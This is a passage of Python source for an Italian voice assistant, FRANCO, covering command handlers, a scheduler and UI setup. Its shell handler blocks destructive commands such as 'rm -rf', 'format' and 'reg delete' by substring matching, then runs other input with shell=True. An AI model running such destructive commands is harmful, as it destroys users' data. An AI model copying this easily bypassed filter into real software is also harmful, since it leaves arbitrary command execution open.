        if getattr(self, "trading", None):
            try:
                pnl = getattr(self.trading, "_last_pnl", None)
                tag = f"P&L {pnl:+.2f}%" if pnl is not None else "attivo"
                moduli.append(f"Trading [{tag}]")
            except Exception as _e:
                moduli.append("Trading [attivo]")
        if getattr(self, "shopping", None):  moduli.append("Shopping [attivo]")
        if getattr(self, "auto", None):
            try:
                nr = len(getattr(self.auto, "_rules", []))
                moduli.append(f"Automazioni [{nr} regole]")
            except Exception as _e:
                moduli.append("Automazioni [attivo]")
        if getattr(self, "brain", None):
            try:
                frags = self.brain.stats().get("frammenti", 0)
                moduli.append(f"Second Brain [{frags} frammenti]")
            except Exception as _e:
                moduli.append("Second Brain [attivo]")
        if getattr(self, "_code_agent", None):
            try:
                proj = getattr(self._code_agent.session, "project_path", None)
                pname = proj.name if proj else "nessuno"
                moduli.append(f"CodeAgent [progetto: {pname}]")
            except Exception as _e:
                moduli.append("CodeAgent [attivo]")
        if getattr(self, "local_ai", None):
            try:
                mn = self.local_ai.model_name
                rdy = "pronto" if self.local_ai.has_real_llm else "fallback"
                moduli.append(f"Local AI [{mn} {rdy}]")
            except Exception as _e:
                moduli.append("Local AI [attivo]")
        if getattr(self, "knowledge", None):
            try:
                st = self.knowledge.stats()
                moduli.append(f"KB [{st['documenti']} doc, {st['chunk']} chunk]")
            except Exception as _e:
                moduli.append("Knowledge Base [attiva]")
        if getattr(self, "downloader", None):
            try:
                ds = self.downloader.get_status()
                moduli.append(f"Assets [{ds['total_gb']:.2f}/{ds['target_gb']} GB]")
            except Exception as _e:
                moduli.append("Downloader [attivo]")
        if moduli:
            lines.append("Moduli: " + " | ".join(moduli) + ".")
        else:
            lines.append("Nessun modulo esterno caricato.")
        cmds = self.state.get("commands_executed", 0)
        lines.append(f"Comandi eseguiti in sessione: {cmds}.")
        return " ".join(lines)

    # ------------------------------------------------------------------
    # KNOWLEDGE BASE
    # ------------------------------------------------------------------

    def _cmd_knowledge_search(self, query: str) -> str:
        """Cerca nella knowledge base locale (Wikipedia + documenti)."""
        if not query or not query.strip():
            return "Dimmi cosa cercare nella knowledge base."
        kb = getattr(self, "knowledge", None)
        if kb is None:
            try:
                from franco_knowledge import get_knowledge
                kb = get_knowledge()
                self.knowledge = kb
            except Exception as e:
                return f"Knowledge base non disponibile: {e}"
        return kb.search_summary(query, top_k=3)

    def _cmd_kb_stats(self) -> str:
        """Statistiche della knowledge base."""
        kb = getattr(self, "knowledge", None)
        if kb is None:
            return "Knowledge base non caricata."
        s = kb.stats()
        return (f"Knowledge Base: {s['documenti']} documenti, {s['chunk']} chunk, "
                f"{s['wiki_articoli']} articoli Wikipedia. "
                f"Database: {s['db_size_mb']} MB.")

    def _cmd_kb_ingest(self, path: str) -> str:
        """Indicizza un file o directory nella knowledge base."""
        from pathlib import Path as _Path
        kb = getattr(self, "knowledge", None)
        if kb is None:
            return "Knowledge base non disponibile."
        p = _Path(path.strip())
        if not p.exists():
            return f"Percorso non trovato: {path}"
        if p.is_dir():
            n = kb.scan_dir(p)
        else:
            n = kb.ingest_file(p)
        return f"Indicizzati {n} chunk da {p.name}."

    def _cmd_asset_status(self) -> str:
        """Mostra lo stato dei download asset FRANCO (LLM, modelli, Wikipedia…)."""
        dl = getattr(self, "downloader", None)
        if dl is None:
            try:
                from franco_downloader import FrancoDownloadManager
                dl = FrancoDownloadManager()
                self.downloader = dl
            except Exception as e:
                return f"Downloader non disponibile: {e}"
        st = dl.get_status()
        lines = [f"Asset FRANCO: {st['total_gb']:.3f} GB / {st['target_gb']} GB ({st['pct']:.1f}%)"]
        lines.append(f"Spazio libero E: {st['free_e_gb']} GB")
        for a in st["assets"]:
            icon = "✓" if a["exists"] else "○"
            sz = f"{a['size_mb']:.0f} MB" if a["exists"] else f"~{a['size_gb_expected']:.1f} GB"
            lines.append(f"  {icon} {a['name']} — {sz}")
        return "\n".join(lines)

    # ------------------------------------------------------------------
    # SYSTEM MONITOR
    # ------------------------------------------------------------------

    def _cmd_system_dashboard(self) -> str:
        """Dashboard testuale del monitor sistema."""
        mon = getattr(self, "system_monitor", None)
        if mon is None:
            try:
                from franco_monitor import get_monitor
                mon = get_monitor()
                self.system_monitor = mon
                mon.start()
            except Exception as e:
                return f"Monitor non disponibile: {e}"
        snap = mon.get_latest()
        if snap is None:
            return "Nessun dato ancora — attendi qualche secondo."
        return mon.text_dashboard()

    def _cmd_system_alerts(self) -> str:
        """Mostra gli ultimi alert di sistema."""
        mon = getattr(self, "system_monitor", None)
        if mon is None:
            return "Monitor non caricato."
        alerts = mon.recent_alerts(10)
        if not alerts:
            return "Nessun alert registrato. Sistema nei parametri normali."
        import datetime as _dt2
        lines = [f"Ultimi {len(alerts)} alert:"]
        for a in alerts:
            dt = _dt2.datetime.fromtimestamp(a["ts"]).strftime("%H:%M:%S")
            lines.append(f"  [{dt}] {a['level']:8s} {a['metric']:12s} = {a['value']:.1f}% (soglia {a['threshold']:.0f}%)")
        return "\n".join(lines)

    # ------------------------------------------------------------------
    # LOCAL AI (offline)
    # ------------------------------------------------------------------

    def _cmd_local_ai_query(self, query: str) -> str:
        """Usa il LLM locale offline per rispondere."""
        if not query or not query.strip():
            return "Cosa vuoi chiedermi in modalità offline?"
        lai = getattr(self, "local_ai", None)
        if lai is None:
            try:
                from franco_local_ai import get_local_ai
                lai = get_local_ai()
                self.local_ai = lai
            except Exception as e:
                return f"Local AI non disponibile: {e}"
        # Arricchisce con contesto dalla knowledge base
        ctx = ""
        kb = getattr(self, "knowledge", None)
        if kb:
            try:
                results = kb.search(query, top_k=2)
                if results:
                    ctx = "\n".join(r["preview"] for r in results)
            except Exception as _e:
                pass  # suppressed error
        return lai.quick(query, context=ctx)

    def _cmd_local_ai_status(self) -> str:
        """Stato del LLM locale."""
        lai = getattr(self, "local_ai", None)
        if lai is None:
            return "Local AI non caricato."
        s = lai.status_dict()
        tipo = "LLM reale" if s["real_llm"] else "Fallback rule-based"
        pronto = "pronto" if s["ready"] else "in caricamento…"
        return f"Local AI: {tipo} | Modello: {s['model']} | Stato: {pronto}"

    # ------------------------------------------------------------------
    # SISTEMA INFO
    # ------------------------------------------------------------------

    def _cmd_system_info(self) -> str:
        if not DEPENDENCIES_STATUS.get('psutil') or not psutil:
            return "psutil non disponibile per statistiche sistema."
        try:
            cpu = psutil.cpu_percent(interval=0.5)
            mem = psutil.virtual_memory()
            disk = psutil.disk_usage("/")
            return (f"CPU: {cpu}%. "
                    f"RAM: {mem.percent}% usata su {mem.total // (1024**3)} GB. "
                    f"Disco: {disk.percent}% usato su {disk.total // (1024**3)} GB.")
        except Exception as e:
            return f"Errore lettura sistema: {e}"

    def _cmd_list_processes(self) -> str:
        if not DEPENDENCIES_STATUS.get('psutil') or not psutil:
            return "psutil non disponibile."
        try:
            # Due giri per avere cpu_percent stabile
            for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
                try: p.cpu_percent()
                except Exception as _e:
                    pass  # suppressed error
            import time as _t; _t.sleep(0.3)
            procs = sorted(
                psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]),
                key=lambda p: p.info.get("cpu_percent") or 0, reverse=True
            )
            top8 = [(p.info.get("name","?")[:20], p.info.get("cpu_percent",0),
                     p.info.get("memory_percent",0)) for p in procs[:8]]
            lines = [f"{n} — CPU {c:.1f}%, RAM {r:.1f}%" for n, c, r in top8]
            return "Top processi per CPU:\n" + "\n".join(lines)
        except Exception as e:
            return f"Errore: {e}"

    def _cmd_kill_process(self, name: str) -> str:
        if getattr(self, "memory_guard", None):
            # A plain kill request is only a proposal. Closing requires the
            # separate phrase "conferma chiudi <nome>" within five minutes.
            listing = self.memory_guard.format_candidates(limit=12)
            return (f"Prima di chiudere {name}, serve una conferma esplicita.\n{listing}")
        return "Non posso terminare processi finché il gestore memoria sicuro non è disponibile."

    def _cmd_network_info(self) -> str:
        local_ip = get_local_ip()
        pub_ip = self.cache.get_or_compute(
            "public_ip", get_public_ip, ttl=300
        ) or "N/A"
        return f"IP locale: {local_ip}. IP pubblico: {pub_ip}."

    # ------------------------------------------------------------------
    # MACRO
    # ------------------------------------------------------------------

    def _cmd_start_macro(self, name: str) -> str:
        if not name:
            return "Specifica un nome per la macro."
        self.state.set("recording_macro", True)
        self.state.set("macro_name", name)
        self.state.set("current_macro", [])
        return f"Registrazione macro '{name}' avviata. Di' 'stop macro' per terminare."

    def _cmd_stop_macro(self) -> str:
        if not self.state.get("recording_macro"):
            return "Nessuna macro in registrazione."
        name = self.state.get("macro_name")
        steps = list(self.state.get("current_macro", []))
        self.state.set("recording_macro", False)
        self._macro_macros[name] = steps
        self.memory.set("macros", self._macro_macros, save=True)
        return f"Macro '{name}' salvata con {len(steps)} comandi."

    def _cmd_run_macro(self, name: str) -> str:
        if not name:
            return "Quale macro devo eseguire?"
        steps = self._macro_macros.get(name)
        if not steps:
            available = list(self._macro_macros.keys())
            return (f"Macro '{name}' non trovata. "
                    f"Disponibili: {', '.join(available) if available else 'nessuna'}.")
        results = []
        for step in steps:
            r = self.process(step)
            if r:
                results.append(r)
        return f"Macro '{name}' eseguita. {len(steps)} comandi completati."

    def _cmd_list_macros(self) -> str:
        if not self._macro_macros:
            return "Nessuna macro salvata."
        return "Macro disponibili: " + ", ".join(self._macro_macros.keys())

    # ------------------------------------------------------------------
    # UI / TEMA
    # ------------------------------------------------------------------

    def _cmd_change_theme(self, theme: str) -> str:
        global ACTIVE_THEME
        theme_lower = theme.lower().strip()
        if theme_lower in THEMES:
            ACTIVE_THEME = theme_lower
            self.config.set("ui.theme", theme_lower)
            self.state.set("active_theme", theme_lower)
            self.event_bus.emit("ui.theme_changed", data=theme_lower)
            return f"Tema cambiato in {theme_lower}."
        available = ", ".join(THEMES.keys())
        return f"Tema '{theme}' non trovato. Disponibili: {available}."

    def _cmd_command_history(self) -> str:
        history = self.db.get_command_history(limit=5)
        if not history:
            return "Nessun comando nella cronologia."
        lines = [f"{h['command'][:40]}" for h in history]
        return "Ultimi comandi: " + " — ".join(lines)

    def _cmd_clear_cache(self) -> str:
        self.cache.clear()
        return "Cache svuotata."

    # ------------------------------------------------------------------
    # DISK MANAGER
    # ------------------------------------------------------------------

    def _cmd_disk_manager(self, t: str, raw: str) -> str:
        cleaner: Optional["DiskCleaner"] = getattr(self, "disk_cleaner", None)
        if cleaner is None:
            return "Modulo disk cleaner non inizializzato."

        if any(k in t for k in ["quant", "spazio libero", "spazio disco", "analizza disco"]):
            usage = cleaner.get_disk_usage()
            if not usage:
                return "Impossibile leggere lo spazio disco."
            lines_out = []
            for mount, info in usage.items():
                pct = info.get("percent", 0)
                free = format_bytes(info.get("free", 0))
                total = format_bytes(info.get("total", 0))
                lines_out.append(f"{mount}: {free} liberi su {total} ({pct:.0f}% usato)")
            return "Spazio disco: " + " — ".join(lines_out)

        elif any(k in t for k in ["file grandi", "file enormi", "grandi file"]):
            top = cleaner.get_large_files(top_n=5, min_size_mb=100)
            if not top:
                return "Nessun file superiore a 100 MB trovato nella home."
            parts = [f"{format_bytes(sz)}: {Path(p).name}" for sz, p in top]
            return "File più grandi: " + ", ".join(parts)

        elif any(k in t for k in ["svuota cestino", "cestino"]):
            ok = cleaner.empty_recycle_bin()
            return "Cestino svuotato." if ok else "Impossibile svuotare il cestino."

        elif any(k in t for k in ["pulisci temp", "file temporanei"]):
            scan = cleaner.scan_junk(max_age_days=3)
            if scan["files"] == 0:
                return "Nessun file temporaneo da rimuovere."
            d, freed = cleaner.clean_temp_dirs(max_age_days=3)
            return f"Rimossi {d} file temporanei, liberati {format_bytes(freed)}."

        else:
            # Pulizia completa
            scan = cleaner.scan_junk(max_age_days=3)
            if scan["files"] == 0:
                return "Disco già pulito. Nessun file spazzatura trovato."
            rep = cleaner.full_cleanup()
            freed = rep.get("total_freed", 0)
            files = rep.get("total_files", 0)
            bin_ok = rep.get("recycle_bin", False)
            msg = f"Pulizia completata: {files} file rimossi, {format_bytes(freed)} liberati."
            if bin_ok:
                msg += " Cestino svuotato."
            return msg

    # ------------------------------------------------------------------
    # HOME ASSISTANT
    # ------------------------------------------------------------------

    def _cmd_home_assistant(self, t: str, raw: str) -> str:
        ha: Optional["HomeAssistantBridge"] = getattr(self, "home_assistant", None)
        if ha is None or not ha.is_available():
            return ("Home Assistant non configurato. "
                    "Imposta le variabili HA_URL e HA_TOKEN per il controllo smart home.")

        # Stato casa
        if any(k in t for k in ["stato casa", "smart home", "home assistant"]):
            return ha.summary()

        # Luci
        if any(k in t for k in ["accendi luce", "luci on"]):
            entity = self._extract_ha_entity(t, "light") or "light.all"
            ok = ha.turn_on(entity)
            name = entity.split(".")[-1].replace("_", " ")
            return f"Luce {name} accesa." if ok else "Errore nell'accendere la luce."

        if any(k in t for k in ["spegni luce", "luci off"]):
            entity = self._extract_ha_entity(t, "light") or "light.all"
            ok = ha.turn_off(entity)
            name = entity.split(".")[-1].replace("_", " ")
            return f"Luce {name} spenta." if ok else "Errore nello spegnere la luce."

        if "luminosità" in t or "brightness" in t:
            num_match = re.search(r"(\d+)\s*%?", t)
            pct = int(num_match.group(1)) if num_match else 50
            entity = self._extract_ha_entity(t, "light") or "light.all"
            ok = ha.set_light_brightness(entity, pct)
            return f"Luminosità impostata al {pct}%." if ok else "Errore luminosità."

        # Temperatura
        if any(k in t for k in ["temperatura casa", "alza temperatura", "abbassa temperatura"]):
            num_match = re.search(r"(\d+(?:\.\d+)?)\s*(?:gradi|°|celsius)?", t)
            if num_match:
                temp = float(num_match.group(1))
                entity = self._extract_ha_entity(t, "climate") or "climate.thermostat"
                ok = ha.set_temperature(entity, temp)
                return f"Temperatura impostata a {temp}°C." if ok else "Errore termostato."
            else:
                state = ha.get_state("climate.thermostat")
                if state:
                    return f"Temperatura attuale: {state.get('state','?')}°C."
                return "Termostato non disponibile."

        # Scene
        if "scena" in t or "scene" in t:
            scene = self._extract_after(t, ["scena ", "scene ", "attiva "])
            ok = ha.run_scene(scene.replace(" ", "_"))
            return f"Scena '{scene}' attivata." if ok else f"Scena '{scene}' non trovata."

        # Generico accendi/spegni
        if any(k in t for k in ["accendi", "spegni"]):
            action = "turn_on" if "accendi" in t else "turn_off"
            entity = self._extract_after(t, ["accendi ", "spegni "])
            entity_id = entity.replace(" ", "_").lower()
            # Prova a indovinare il dominio
            for domain in ("switch", "light", "input_boolean", "fan"):
                fid = f"{domain}.{entity_id}"
                result = ha.call_service("homeassistant", action, fid)
                if result:
                    return f"{'Acceso' if action=='turn_on' else 'Spento'}: {entity}."
            return f"Dispositivo '{entity}' non trovato in Home Assistant."

        return ha.summary()

    def _extract_ha_entity(self, t: str, domain: str) -> Optional[str]:
        """Estrae entity_id HA dal testo (es. 'luce soggiorno' -> 'light.soggiorno')"""
        keywords = ["luce ", "il ", "la ", "dello ", "della ", "del ", "di ", "in "]
        room = self._extract_after(t, keywords).split()[0] if t else None
        if room:
            return f"{domain}.{room.lower()}"
        return None

    # ------------------------------------------------------------------
    # BRIEFING GIORNALIERO
    # ------------------------------------------------------------------

    def _cmd_weather(self, city: str = "Milano") -> str:
        """Recupera le condizioni meteo da wttr.in (no API key richiesta)."""
        try:
            city_enc = city.strip().replace(" ", "+")
            url = f"https://wttr.in/{city_enc}?format=3&lang=it"
            req = urllib.request.Request(url, headers={"User-Agent": "FRANCO/6.0"})
            with urllib.request.urlopen(req, timeout=8) as r:
                data = r.read().decode("utf-8", errors="ignore").strip()
            return data if data else f"Meteo non disponibile per {city}."
        except Exception as e:
            return f"Meteo non disponibile: {e}"

    def _cmd_daily_brief(self) -> str:
        user = self.memory.get_user_name()
        now = datetime.now()
        parts = [f"Briefing delle {now.strftime('%H:%M')}, {user}."]

        # Promemoria nelle prossime 8 ore
        try:
            due = self.db.get_upcoming_reminders(hours=8)
            if due:
                for r in due[:3]:
                    parts.append(f"Promemoria: {r.get('title','?')}.")
        except Exception as _e:
            pass  # suppressed error

        # Meteo — prima dal state, altrimenti live da wttr.in
        weather = self.state.get("weather")
        if weather:
            temp = weather.get("temp", "?")
            desc = weather.get("desc", "")
            rain = float(weather.get("rain_mm", 0) or 0)
            parts.append(f"Meteo: {desc}, {temp} gradi." +
                         (" Prevista pioggia." if rain > 0.5 else ""))
        else:
            try:
                wdata = self._cmd_weather("Milano")
                if wdata and len(wdata) > 5:
                    parts.append(f"Meteo: {wdata}")
            except Exception as _e:
                pass  # suppressed error

        # Sistema
        cpu = self.state.get("cpu_percent", 0)
        ram = self.state.get("ram_percent", 0)
        if cpu or ram:
            warn = " Carico elevato!" if float(cpu or 0) > 80 else ""
            parts.append(f"Sistema: CPU {cpu:.0f}%, RAM {ram:.0f}%.{warn}")

        # Trading
        try:
            trading = getattr(self, "trading", None)
            if trading:
                pf = trading.portfolio_summary_text()
                if pf and "non disponibile" not in pf.lower():
                    # Estrai solo la parte rilevante per il briefing
                    short = pf.split(".")[0] + "." if "." in pf else pf[:120]
                    parts.append(f"Trading: {short}")

                # Stream status
                ss = trading.stream_status_text()
                if "attivo" in ss.lower() or "connesso" in ss.lower():
                    parts.append("Stream dati di mercato attivo.")
        except Exception as _e:
            pass  # suppressed error

        # Memoria recente (Second Brain)
        try:
            if getattr(self, "brain", None):
                st = self.brain.stats()
                n = st.get("frammenti", 0)
                if n > 0:
                    parts.append(f"Secondo cervello: {n} ricordi disponibili.")
        except Exception as _e:
            pass  # suppressed error

        # Usa OmniAI per rendere il briefing naturale
        brain = getattr(self, "omni", None) or getattr(self, "router", None)
        if brain and getattr(brain, "is_available", lambda: False)() and len(parts) > 2:
            try:
                prompt = ("Trasforma questo briefing in 2-3 frasi naturali, concise e dirette "
                          "per un assistente AI personale. Usa italiano formale ma non burocratico: "
                          + " ".join(parts))
                result = brain.chat(prompt, max_tokens=250, temperature=0.6, task_type="conversational")
                if result and len(result) > 20:
                    return result
            except Exception as _e:
                pass  # suppressed error
        elif self.ai.is_available() and len(parts) > 2:
            prompt = "Trasforma questo briefing in una frase naturale e concisa: " + " ".join(parts)
            return self.ai.chat(prompt, max_tokens=200)

        return " ".join(parts) if len(parts) > 1 else "Nessun aggiornamento al momento."

    # ------------------------------------------------------------------
    # SHELL / CMD
    # ------------------------------------------------------------------

    # Parole-chiave usate come prefisso trigger — vengono rimosse per
    # isolare il vero comando da eseguire
    _SHELL_TRIGGERS = [
        "esegui nel cmd ", "esegui nel terminale ", "esegui comando ",
        "lancia nel cmd ", "lancia nel terminale ", "comando cmd: ",
        "comando terminale: ", "nel cmd ", "nel terminale ",
        "cmd: ", "shell: ", "apri terminale ed esegui ",
        "esegui su cmd ", "esegui ",
    ]

    # Comandi bloccati per sicurezza (lista minima, estendibile)
    _SHELL_BLACKLIST = [
        "format", "del /", "rd /s", "rm -rf", "rmdir /s",
        "reg delete", "bcdedit", "diskpart",
        "net user", "net localgroup administrators",
        "shutdown /f", "taskkill /f /im explorer",
    ]

    def _extract_shell_command(self, raw: str) -> str:
        """Rimuove il trigger vocale e restituisce solo il comando da eseguire."""
        lower = raw.lower()
        for trigger in self._SHELL_TRIGGERS:
            idx = lower.find(trigger)
            if idx != -1:
                return raw[idx + len(trigger):].strip()
        # Nessun trigger trovato: ritorna stringa vuota
        return ""

    def _cmd_shell(self, cmd: str, timeout: int = 15) -> str:
        """
        Esegue un comando nel CMD di Windows e restituisce stdout/stderr.
        • Timeout: 15 s (configurabile).
        • Output troncato a 1500 caratteri.
        • Blocca pattern pericolosi.
        """
        if not cmd:
            return "Nessun comando da eseguire."

        cmd_lower = cmd.lower()
        for blocked in self._SHELL_BLACKLIST:
            if blocked in cmd_lower:
                return (f"Comando bloccato per sicurezza: '{blocked}' non è consentito. "
                        "Eseguilo manualmente se necessario.")

        self.logger.info("SHELL", f"Esecuzione: {cmd}")
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=timeout,
                cwd=os.path.expanduser("~"),
            )
            stdout = result.stdout.strip()
            stderr = result.stderr.strip()
            rc = result.returncode

            parts = []
            if stdout:
                parts.append(stdout)
            if stderr:
                parts.append(f"[stderr] {stderr}")

            output = "\n".join(parts).strip()
            if not output:
                output = f"Comando eseguito (exit code {rc})."

            # Tronca output lungo
            if len(output) > 1500:
                output = output[:1500] + "\n… (output troncato)"

            status = "completato" if rc == 0 else f"terminato con codice {rc}"
            return f"Comando {status}:\n{output}"

        except subprocess.TimeoutExpired:
            return f"Timeout: il comando non ha risposto entro {timeout} secondi."
        except FileNotFoundError:
            return f"Comando non trovato: '{cmd.split()[0]}'. Verifica il nome del programma."
        except Exception as e:
            return f"Errore durante l'esecuzione: {e}"

    # ------------------------------------------------------------------
    # HELPERS
    # ------------------------------------------------------------------

    def _extract_after(self, text: str, prefixes: List[str]) -> str:
        text_lower = text.lower()
        for prefix in sorted(prefixes, key=len, reverse=True):
            idx = text_lower.find(prefix.lower())
            if idx != -1:
                return text[idx + len(prefix):].strip()
        return text.strip()

    def _extract_target(self, text: str) -> Optional[str]:
        """Extract IP or hostname from text"""
        ip_match = REGEX_PATTERNS["ip_v4"].search(text)
        if ip_match:
            return ip_match.group()
        # Hostname pattern
        host_match = re.search(r"\b([\w.-]+\.\w{2,})\b", text)
        if host_match:
            candidate = host_match.group(1)
            # Filtro parole comuni
            if candidate not in {"scan.porte", "deep.scan", "vuln.scan"}:
                return candidate
        return None

    def _extract_number(self, text: str, default: int = 10) -> int:
        _IT_NUMS = {
            "uno": 1, "due": 2, "tre": 3, "quattro": 4, "cinque": 5,
            "sei": 6, "sette": 7, "otto": 8, "nove": 9, "dieci": 10,
            "venti": 20, "trenta": 30, "quaranta": 40, "cinquanta": 50,
            "cento": 100, "mille": 1000,
        }
        t = text.lower()
        for word, val in _IT_NUMS.items():
            if re.search(rf"\b{word}\b", t):
                return val
        match = re.search(r"\b(\d+)\b", text)
        return int(match.group(1)) if match else default

    def _categorize(self, text: str) -> str:
        if any(k in text for k in ["apri", "chiudi", "lancia", "avvia"]):
            return "app"
        if any(k in text for k in ["cerca", "google", "youtube", "url"]):
            return "web"
        if any(k in text for k in ["scan", "password", "hash", "ssl", "dns", "sicurezza"]):
            return "security"
        if any(k in text for k in ["codice", "script", "programma", "genera"]):
            return "code"
        if any(k in text for k in ["email", "mail"]):
            return "email"
        if any(k in text for k in ["screenshot", "schermo", "vedi"]):
            return "vision"
        if any(k in text for k in ["nota", "promemoria", "timer"]):
            return "productivity"
        if any(k in text for k in ["file", "cartella", "backup"]):
            return "file"
        if any(k in text for k in ["volume", "musica"]):
            return "media"
        return "ai"


# ==============================================================================
# SCHEDULER — Task pianificati
# ==============================================================================

class TaskScheduler:
    """
    Scheduler per task ricorrenti:
    - Backup automatico
    - Promemoria
    - System metrics update
    """

    def __init__(self, logger: StructuredLogger, state: StateManager,
                 event_bus: EventBus, db: DatabaseManager,
                 command_engine: CommandEngine, memory: MemoryManager):
        self.logger = logger
        self.state = state
        self.event_bus = event_bus
        self.db = db
        self.engine = command_engine
        self.memory = memory

        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._tasks: Dict[str, Dict] = {}

        # Task built-in
        self._register_builtin_tasks()

    def _register_builtin_tasks(self):
        """Register default periodic tasks"""
        self._tasks = {
            "metrics_update": {
                "interval": 10,
                "last_run": 0,
                "func": self._task_update_metrics,
            },
            "memory_guard": {
                "interval": 15,
                "last_run": 0,
                "func": self._task_memory_guard,
            },
            "reminder_check": {
                "interval": 60,
                "last_run": 0,
                "func": self._task_check_reminders,
            },
            "auto_backup": {
                "interval": 3600,
                "last_run": 0,
                "func": self._task_auto_backup,
            },
            "uptime_update": {
                "interval": 5,
                "last_run": 0,
                "func": self._task_update_uptime,
            },
        }

    def start(self):
        self._running = True
        self._thread = threading.Thread(
            target=self._loop, daemon=True, name="TaskScheduler"
        )
        self._thread.start()
        self.logger.success("SCHEDULER", "Task scheduler avviato")

    def stop(self):
        self._running = False

    def _loop(self):
        while self._running:
            now = time.time()
            for task_id, task in self._tasks.items():
                if now - task["last_run"] >= task["interval"]:
                    task["last_run"] = now
                    try:
                        task["func"]()
                    except Exception as e:
                        self.logger.error("SCHEDULER", f"Task {task_id} error: {e}")
            time.sleep(1)

    def _task_update_metrics(self):
        """Update system metrics in state"""
        if not DEPENDENCIES_STATUS.get('psutil') or not psutil:
            return
        try:
            self.state.update({
                "cpu_percent": psutil.cpu_percent(),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_percent": psutil.disk_usage("/").percent,
            }, notify=False)
        except Exception as _e:
            pass  # suppressed error

    def _task_check_reminders(self):
        """Check for due reminders"""
        try:
            due = self.db.get_upcoming_reminders(hours=0.017)  # ~1 minuto
            for rem in due:
                title = rem.get("title", "Promemoria")
                self.event_bus.emit("reminder.due",
                                    data={"reminder": rem},
                                    source="Scheduler",
                                    priority=Priority.HIGH)
                self.db.complete_reminder(rem["id"])
                self.logger.info("SCHEDULER", f"Promemoria scattato: {title}")
        except Exception as _e:
            pass  # suppressed error

    def _task_memory_guard(self):
        guard = getattr(self.engine, "memory_guard", None)
        if guard is not None:
            guard.monitor_once()

    def _task_auto_backup(self):
        """Periodic automatic backup of FRANCO data"""
        try:
            ts = datetime.now().strftime("%Y%m%d")
            # Esegue backup solo se non già fatto oggi
            cache_key = f"backup_done_{ts}"
            if not self.state.get(cache_key):
                from pathlib import Path
                # Backup solo file JSON/DB critici
                for f in [MEMORY_FILE, MAIN_DATABASE]:
                    if Path(str(f)).exists():
                        from backup_mgr import backup_file  # già disponibile via engine
                        pass
                self.state.set(cache_key, True)
                self.logger.info("SCHEDULER", "Auto-backup completato")
        except Exception as _e:
            pass  # suppressed error

    def _task_update_uptime(self):
        """Update session uptime"""
        start = self.state.get("session_start")
        if isinstance(start, datetime):
            uptime = (datetime.now() - start).total_seconds()
            self.state.set("uptime_seconds", uptime, notify=False)


# ==============================================================================
# UI PYGAME — Interfaccia olografica
# ==============================================================================

class HolographicUI:
    """
    UI Jarvis-style completamente riscritta:
    - Layout 3 colonne (metrics | sfera centrale | chat)
    - Chat interattiva con input testuale
    - Notifiche in-UI per ProactiveMonitor
    - Pannello meteo e batteria
    - Animazioni 60fps con glow reale
    - Tasto F11 fullscreen, ESC chiude, T/Enter apre chat
    """

    _NOTIFICATION_MAX = 4
    _CHAT_HISTORY_MAX = 200

    def __init__(self, state: "StateManager", event_bus: "EventBus",
                 logger: "StructuredLogger",
                 transcript_buffer: "deque",
                 command_queue: "queue.Queue"):
        self.state = state
        self.event_bus = event_bus
        self.logger = logger
        self.transcript_buffer = transcript_buffer
        self.command_queue = command_queue

        self._running = False
        self._screen = None
        self._clock = None
        self._fonts = {}

        self._angle = 0.0
        self._pulse = 0.0
        self._wave_data = [0.0] * 100
        self._particles = []
        self._sphere_points = []

        # Chat
        self._input_text = ""
        self._input_active = False
        self._chat_scroll = 0
        self._chat_lines = []
        self._chat_lock  = threading.Lock()

        # Notifiche in-UI
        from collections import deque as _deque
        self._notifications = _deque(maxlen=self._NOTIFICATION_MAX)

        self.event_bus.subscribe("proactive.alert", self._on_proactive_alert)

        # ── Sezioni UI ────────────────────────────────────────────────────────
        # Ogni sezione ha: id, label, emoji, colore accent
        # Icone: solo caratteri BMP (U+0000-U+FFFF). Le emoji "astral plane"
        # (es. 💬📈🛒🧠🛡️) mandano in segfault SDL_ttf/pygame su alcuni sistemi
        # Windows durante il rendering del font — vanno evitate qui.
        self._SECTIONS = [
            {"id": "home",       "label": "CHAT",        "icon": "F", "color": (255,255,255)},
            {"id": "chat",       "label": "CHAT",        "icon": "✉", "color": (0,200,180)},
            {"id": "trading",    "label": "TRADING",     "icon": "▲", "color": (0,220,130)},
            {"id": "shopping",   "label": "SHOPPING",    "icon": "▣", "color": (255,200,50)},
            {"id": "code",       "label": "CODE",        "icon": "⚡", "color": (180,100,255)},
            {"id": "canvas",     "label": "CANVAS",      "icon": "◇", "color": (255,165,65)},
            {"id": "auto",       "label": "AUTO",        "icon": "⚙", "color": (255,140,0)},
            {"id": "brain",      "label": "BRAIN",       "icon": "◈", "color": (255,80,120)},
        ]
        self._active_section = "home"
        self._section_scroll: dict = {s["id"]: 0 for s in self._SECTIONS}
        self._section_rects:  dict = {}   # {id: pygame.Rect} per click detection
        self._sidebar_w = 72             # larghezza sidebar sezioni

        # ── Input bar unificata (visibile in tutte le sezioni) ────────────────
        self._sec_input_text: str  = ""   # testo input corrente nella sezione
        self._sec_input_active: bool = False
        self._sec_cmd_history: list = []  # history comandi sezione
        self._sec_history_idx: int  = -1
        # Output inline per ciascuna sezione (ultimi N risultati)
        self._sec_output: dict = {s["id"]: [] for s in self._SECTIONS}
        self._orb_experience = OrbExperience(self)
        self._canvas = LiveCanvas(DATA_DIR, self.logger)

    def push_notification(self, text: str, level: str = "info"):
        import datetime as _dt
        ts = _dt.datetime.now().strftime("%H:%M")
        self._notifications.append({"text": text, "level": level, "ts": ts})

    def _on_proactive_alert(self, event):
        msg = event.data.get("message", "") if hasattr(event, "data") and event.data else ""
        lvl = event.data.get("level", "info") if hasattr(event, "data") and event.data else "info"
        if msg:
            self.push_notification(msg, lvl)

    # ------------------------------------------------------------------ #

    def _get_theme(self):
        return get_theme()

    # ═══════════════════════════════════════════════════════════════════
    #  NEURAL INTERFACE  — nuova UI ispirata allo screenshot
    # ═══════════════════════════════════════════════════════════════════

    # Palette fissa (deep blue neural)
    _C_BG       = (3, 6, 15)
    _C_DEEP     = (0, 20, 60)
    _C_CORE     = (30, 150, 255)     # blu brillante
    _C_MID      = (0, 80, 200)
    _C_OUTER    = (0, 40, 120)
    _C_SPARK    = (180, 230, 255)    # bianco-azzurro scintille
    _C_TEXT     = (160, 200, 240)
    _C_DIM      = (60, 100, 140)
    _C_SUCCESS  = (0, 220, 130)
    _C_DANGER   = (255, 70, 70)
